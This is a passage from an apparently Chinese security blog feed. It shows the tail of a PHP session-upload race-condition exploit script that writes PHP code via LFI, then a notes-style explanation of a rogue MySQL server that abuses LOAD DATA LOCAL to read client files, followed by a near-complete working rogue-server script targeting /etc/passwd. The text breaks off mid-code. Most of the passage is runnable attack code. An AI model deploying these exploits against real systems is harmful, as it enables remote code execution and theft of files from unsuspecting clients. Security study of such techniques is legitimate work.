punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> rf<span class="token triple-quoted-string string">'''&lt;?php file_put_contents('/tmp/success', '&lt;?=phpinfo()?>'); echo('{flag}'); ?>'''</span><span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token operator">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            target<span class="token punctuation">,</span>            data<span class="token operator">=</span>data<span class="token punctuation">,</span>            files<span class="token operator">=</span>files<span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> flag<span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token operator">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            f<span class="token string">'{target}?file=/tmp/sess_{flag}'</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span>        <span class="token keyword">if</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            e<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    futures <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    pool <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>upload<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>write<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span>    wait<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>+++</p><h2 id="异常退出php以保留临时文件"><a href="#异常退出php以保留临时文件" class="headerlink" title="异常退出php以保留临时文件"></a>异常退出php以保留临时文件</h2><p>如果仅仅是为了执行一次命令，比如CTF比赛，直接条件竞争临时文件没有问题，但如果想长久的将文件保存，有两种方法</p><p>一、目前最常用的办法：在临时文件中执行shell将木马写入其他文件</p><p>二、使php异常退出让存有木马的临时文件得以留存</p><p>之所以需要方法二，是因为在无法快速得知临时文件名的情况下，不可能通过爆破的手段得到临时文件名，所以让临时文件保存下来慢慢爆破无疑是个好选择</p><p>+++</p><p><img src="image-20211103183322927.png" alt="image-20211103183322927"></p><p>这个漏洞在7.1.20以后被修复</p><p><img src="image-20211103183631152.png" alt="image-20211103183631152"></p><p>+++</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪造恶意mysql</title>
      <link href="/2021/10/28/%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8Fmysql/"/>
      <url>/2021/10/28/%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8Fmysql/</url>
      
        <content type="html"><![CDATA[<h1 id="原理简析"><a href="#原理简析" class="headerlink" title="原理简析"></a>原理简析</h1><p>看了网上关羽这方面的几篇文章，我觉得这个漏洞还是比较有意思的，虽说一般不会用到</p><p>就现在来说，往往服务器对安全的防御是比较高的，而个人主机，或者说客户端则不同，往往没有很高的防护，一个杀毒软件就基本了事</p><p>恶意mysql利用了一个很有意思的mysql现象</p><h2 id="load-data-local"><a href="#load-data-local" class="headerlink" title="load data local"></a>load data local</h2><blockquote><p>mysql有两个语句：</p><p>读取服务器的文件到数据库：load data infile “文件路径” into table 表名</p><p>读取客户端文件到数据库： load data local infile “文件路径” into table 表名</p></blockquote><p>这里也比较有意思，第一条语句会因为权限问题，secure-file-priv 配置问题导致写入失败，而第二条来着不拒，着实离谱</p><p><img src="image-20211028210721687.png" alt="image-20211028210721687"></p><p>这里我使用普通用户权限运行mysql</p><p><img src="image-20211028210822219.png" alt="image-20211028210822219"></p><p>可以看到，上面load data local 写入成功，下面报错</p><p>感情我在服务器本地访问mysql算客户端[好像也没毛病]，那是不是有个sql注入我就能读文件了</p><p>注：经测试确实可以，不过目前测试只能用于堆叠注入</p><h2 id="mysql读取文件三次握手"><a href="#mysql读取文件三次握手" class="headerlink" title="mysql读取文件三次握手"></a>mysql读取文件三次握手</h2><p>刚一时觉得这语句过于离谱跑题了，言归正传</p><p>上面我们现在已经知道了load data local 语句可以读取客户端的文件</p><p>这条语句运行时，客户端和mysql会有一个类似三次握手的请求过程</p><p>口语化来说就是这样：</p><blockquote><p>客户端：我这有个/var/www/html/1.txt文件，你把它读进你数据库里</p><p>mysql： 行，给我你的/var/www/html/1.txt</p><p>客户端：给，这是我的/var/www/html/1.txt</p><p>mysql： 收到了，ok</p></blockquote><p>但第一句和第二句其实没有必然的关系，这是第二个离谱的地方</p><p>官方也指出了这个语法的问题：</p><p><img src="image.png" alt="image.png-100kB"></p><p>简单说就是</p><blockquote><p><strong>客户端：我这有个/var/www/html/1.txt文件，你把它读进你数据库里</strong></p><p><strong>mysql： 行，给我你的/etc/passwd</strong></p><p><strong>客户端：给，这是我的/etc/passwd</strong></p><p><strong>mysql： 收到了，ok</strong></p></blockquote><p>就是这样，客户端离谱的就像一个小受</p><p>mysql最终读进数据库的文件和客户端最初想给的没有半毛钱关系</p><h2 id="mysql访问即请求"><a href="#mysql访问即请求" class="headerlink" title="mysql访问即请求"></a>mysql访问即请求</h2><p>我刚看到这里的时候，有一个问题，如果客户端不发送load data local 请求，那不就无法读取请求了</p><p>可我万万没想到，这里还能更离谱</p><p><img src="image-16354282109903.png" alt="image.png-10.3kB"></p><p>正如上图所示，Client和服务器之间的交互其实是可以从查询开始的</p><p>口语理解就是</p><blockquote><p><strong>客户端：我想执行select * from aaa</strong></p><p><strong>mysql： 行，给我你的/etc/passwd</strong></p><p><strong>客户端：给，这是我的/etc/passwd</strong></p><p><strong>mysql： 收到了，ok</strong></p></blockquote><p>就很离谱</p><p>而但各个语言的第三方包连接mysql时，基本都会在连接成功后发送一个select 语句查询版本号，编码之类的数据</p><p>这就相当于只要Client访问了mysql的网站，第一步请求就完成了，如果mysql返回了恶意请求，Client就会直接被恶意攻击</p><h2 id="制作恶意服务端"><a href="#制作恶意服务端" class="headerlink" title="制作恶意服务端"></a>制作恶意服务端</h2><p>综上所述，制作恶意服务器实际上只需要伪造两个数据包</p><p>1、mysql收到客户端请求后发送的读取文件的请求</p><p>2、mysql成功读取到文件的确认请求</p><p>这两个包的格式exp，poc都可以直接在官方文档找到</p><p><code>https://dev.mysql.com/doc/internals/en/com-query-response.html</code></p><p>不过弄了半天，发现手撸数据包这种事我果然还是有点不会，先记小本本上以后学</p><p>这里又两个已经写好的exp</p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><blockquote><p>运行时后台静默，监控同目录下mysql.log查看结果</p><p>可同时读取多个文件，功能强大</p><p>适合用于制作蜜罐</p></blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding: utf8</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> asyncore<span class="token keyword">import</span> asynchat<span class="token keyword">import</span> struct<span class="token keyword">import</span> random<span class="token keyword">import</span> logging<span class="token keyword">import</span> logging<span class="token punctuation">.</span>handlersPORT <span class="token operator">=</span> <span class="token number">3306</span>log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>tmp_format <span class="token operator">=</span> logging<span class="token punctuation">.</span>handlers<span class="token punctuation">.</span>WatchedFileHandler<span class="token punctuation">(</span><span class="token string">'mysql.log'</span><span class="token punctuation">,</span> <span class="token string">'ab'</span><span class="token punctuation">)</span>tmp_format<span class="token punctuation">.</span>setFormatter<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>Formatter<span class="token punctuation">(</span><span class="token string">"%(asctime)s:%(levelname)s:%(message)s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>    tmp_format<span class="token punctuation">)</span>filelist <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#    r'c:\boot.ini',</span>    <span class="token comment" spellcheck="true"># r'c:\windows\win.ini',</span><span class="token comment" spellcheck="true">#    r'c:\windows\system32\drivers\etc\hosts',</span>   <span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#    '/etc/shadow',</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#================================================</span><span class="token comment" spellcheck="true">#=======No need to change after this lines=======</span><span class="token comment" spellcheck="true">#================================================</span>__author__ <span class="token operator">=</span> <span class="token string">'Gifts'</span><span class="token keyword">def</span> <span class="token function">daemonize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> os<span class="token punctuation">,</span> warnings    <span class="token keyword">if</span> os<span class="token punctuation">.</span>name <span class="token operator">!=</span> <span class="token string">'posix'</span><span class="token punctuation">:</span>        warnings<span class="token punctuation">.</span>warn<span class="token punctuation">(</span><span class="token string">'Cant create daemon on non-posix system'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>setsid<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>umask<span class="token punctuation">(</span><span class="token number">0o022</span><span class="token punctuation">)</span>    null<span class="token operator">=</span>os<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'/dev/null'</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_RDWR<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>null<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        <span class="token keyword">except</span> OSError <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">if</span> e<span class="token punctuation">.</span>errno <span class="token operator">!=</span> <span class="token number">9</span><span class="token punctuation">:</span> <span class="token keyword">raise</span>    os<span class="token punctuation">.</span>close<span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">LastPacket</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">OutOfOrder</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">mysql_packet</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    packet_header <span class="token operator">=</span> struct<span class="token punctuation">.</span>Struct<span class="token punctuation">(</span><span class="token string">'&lt;Hbb'</span><span class="token punctuation">)</span>    packet_header_long <span class="token operator">=</span> struct<span class="token punctuation">.</span>Struct<span class="token punctuation">(</span><span class="token string">'&lt;Hbbb'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> packet_type<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>packet_type<span class="token punctuation">,</span> mysql_packet<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>packet_num <span class="token operator">=</span> packet_type<span class="token punctuation">.</span>packet_num <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>packet_num <span class="token operator">=</span> packet_type        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> payload    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        payload_len <span class="token operator">=</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> payload_len <span class="token operator">&lt;</span> <span class="token number">65536</span><span class="token punctuation">:</span>            header <span class="token operator">=</span> mysql_packet<span class="token punctuation">.</span>packet_header<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>payload_len<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>packet_num<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            header <span class="token operator">=</span> mysql_packet<span class="token punctuation">.</span>packet_header<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>payload_len <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">,</span> payload_len <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>packet_num<span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token string">"{0}{1}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>            header<span class="token punctuation">,</span>            self<span class="token punctuation">.</span>payload        <span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> repr<span class="token punctuation">(</span>str<span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">)</span>    @staticmethod    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>raw_data<span class="token punctuation">)</span><span class="token punctuation">:</span>        packet_num <span class="token operator">=</span> ord<span class="token punctuation">(</span>raw_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> raw_data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> mysql_packet<span class="token punctuation">(</span>packet_num<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">http_request_handler</span><span class="token punctuation">(</span>asynchat<span class="token punctuation">.</span>async_chat<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>        asynchat<span class="token punctuation">.</span>async_chat<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> sock<span class="token operator">=</span>addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>addr <span class="token operator">=</span> addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>ibuffer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>set_terminator<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'LEN'</span>        self<span class="token punctuation">.</span>sub_state <span class="token operator">=</span> <span class="token string">'Auth'</span>        self<span class="token punctuation">.</span>logined <span class="token operator">=</span> <span class="token boolean">False</span>        self<span class="token punctuation">.</span>push<span class="token punctuation">(</span>            mysql_packet<span class="token punctuation">(</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">(</span>                    <span class="token string">'\x0a'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># Protocol</span>                    <span class="token string">'3.0.0-Evil_Mysql_Server'</span> <span class="token operator">+</span> <span class="token string">'\0'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># Version</span>                    <span class="token comment" spellcheck="true">#'5.1.66-0+squeeze1' + '\0',</span>                    <span class="token string">'\x36\x00\x00\x00'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># Thread ID</span>                    <span class="token string">'evilsalt'</span> <span class="token operator">+</span> <span class="token string">'\0'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># Salt</span>                    <span class="token string">'\xdf\xf7'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># Capabilities</span>                    <span class="token string">'\x08'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># Collation</span>                    <span class="token string">'\x02\x00'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># Server Status</span>                    <span class="token string">'\0'</span> <span class="token operator">*</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># Unknown</span>                    <span class="token string">'evil2222'</span> <span class="token operator">+</span> <span class="token string">'\0'</span><span class="token punctuation">,</span>                <span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>        <span class="token punctuation">)</span>        self<span class="token punctuation">.</span>order <span class="token operator">=</span> <span class="token number">1</span>        self<span class="token punctuation">.</span>states <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'LOGIN'</span><span class="token punctuation">,</span> <span class="token string">'CAPS'</span><span class="token punctuation">,</span> <span class="token string">'ANY'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        log<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'Pushed: %r'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>        data <span class="token operator">=</span> str<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        asynchat<span class="token punctuation">.</span>async_chat<span class="token punctuation">.</span>push<span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">collect_incoming_data</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        log<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'Data recved: %r'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ibuffer<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">found_terminator</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ibuffer<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ibuffer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>state <span class="token operator">==</span> <span class="token string">'LEN'</span><span class="token punctuation">:</span>            len_bytes <span class="token operator">=</span> ord<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span><span class="token operator">*</span>ord<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">65536</span><span class="token operator">*</span>ord<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">if</span> len_bytes <span class="token operator">&lt;</span> <span class="token number">65536</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>set_terminator<span class="token punctuation">(</span>len_bytes<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'Data'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'MoreLength'</span>        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>state <span class="token operator">==</span> <span class="token string">'MoreLength'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>push<span class="token punctuation">(</span>None<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>close_when_done<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'Data'</span>        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>state <span class="token operator">==</span> <span class="token string">'Data'</span><span class="token punctuation">:</span>            packet <span class="token operator">=</span> mysql_packet<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>order <span class="token operator">!=</span> packet<span class="token punctuation">.</span>packet_num<span class="token punctuation">:</span>                    <span class="token keyword">raise</span> OutOfOrder<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># Fix ?</span>                    self<span class="token punctuation">.</span>order <span class="token operator">=</span> packet<span class="token punctuation">.</span>packet_num <span class="token operator">+</span> <span class="token number">2</span>                <span class="token keyword">if</span> packet<span class="token punctuation">.</span>packet_num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> packet<span class="token punctuation">.</span>payload<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\x03'</span><span class="token punctuation">:</span>                        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Query'</span><span class="token punctuation">)</span>                        filename <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>filelist<span class="token punctuation">)</span>                        PACKET <span class="token operator">=</span> mysql_packet<span class="token punctuation">(</span>                            packet<span class="token punctuation">,</span>                            <span class="token string">'\xFB{0}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>                        <span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>set_terminator<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'LEN'</span>                        self<span class="token punctuation">.</span>sub_state <span class="token operator">=</span> <span class="token string">'File'</span>                        self<span class="token punctuation">.</span>push<span class="token punctuation">(</span>PACKET<span class="token punctuation">)</span>                    <span class="token keyword">elif</span> packet<span class="token punctuation">.</span>payload<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\x1b'</span><span class="token punctuation">:</span>                        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'SelectDB'</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>push<span class="token punctuation">(</span>mysql_packet<span class="token punctuation">(</span>                            packet<span class="token punctuation">,</span>                            <span class="token string">'\xfe\x00\x00\x02\x00'</span>                        <span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">raise</span> LastPacket<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">elif</span> packet<span class="token punctuation">.</span>payload<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token string">'\x02'</span><span class="token punctuation">:</span>                        self<span class="token punctuation">.</span>push<span class="token punctuation">(</span>mysql_packet<span class="token punctuation">(</span>                            packet<span class="token punctuation">,</span> <span class="token string">'\0\0\0\x02\0\0\0'</span>                        <span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">raise</span> LastPacket<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">elif</span> packet<span class="token punctuation">.</span>payload <span class="token operator">==</span> <span class="token string">'\x00\x01'</span><span class="token punctuation">:</span>                        self<span class="token punctuation">.</span>push<span class="token punctuation">(</span>None<span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>close_when_done<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> self<span class="token punctuation">.</span>sub_state <span class="token operator">==</span> <span class="token string">'File'</span><span class="token punctuation">:</span>                        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'-- result'</span><span class="token punctuation">)</span>                        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Result: %r'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>                        <span class="token keyword">if</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                            self<span class="token punctuation">.</span>push<span class="token punctuation">(</span>                                mysql_packet<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token string">'\0\0\0\x02\0\0\0'</span><span class="token punctuation">)</span>                            <span class="token punctuation">)</span>                            <span class="token keyword">raise</span> LastPacket<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            self<span class="token punctuation">.</span>set_terminator<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                            self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'LEN'</span>                            self<span class="token punctuation">.</span>order <span class="token operator">=</span> packet<span class="token punctuation">.</span>packet_num <span class="token operator">+</span> <span class="token number">1</span>                    <span class="token keyword">elif</span> self<span class="token punctuation">.</span>sub_state <span class="token operator">==</span> <span class="token string">'Auth'</span><span class="token punctuation">:</span>                        self<span class="token punctuation">.</span>push<span class="token punctuation">(</span>mysql_packet<span class="token punctuation">(</span>                            packet<span class="token punctuation">,</span> <span class="token string">'\0\0\0\x02\0\0\0'</span>                        <span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">raise</span> LastPacket<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'-- else'</span><span class="token punctuation">)</span>                        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">'Unknown packet'</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> LastPacket<span class="token punctuation">:</span>                log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Last packet'</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'LEN'</span>                self<span class="token punctuation">.</span>sub_state <span class="token operator">=</span> None                self<span class="token punctuation">.</span>order <span class="token operator">=</span> <span class="token number">0</span>                self<span class="token punctuation">.</span>set_terminator<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> OutOfOrder<span class="token punctuation">:</span>                log<span class="token punctuation">.</span>warning<span class="token punctuation">(</span><span class="token string">'Out of order'</span><span class="token punctuation">)</span>                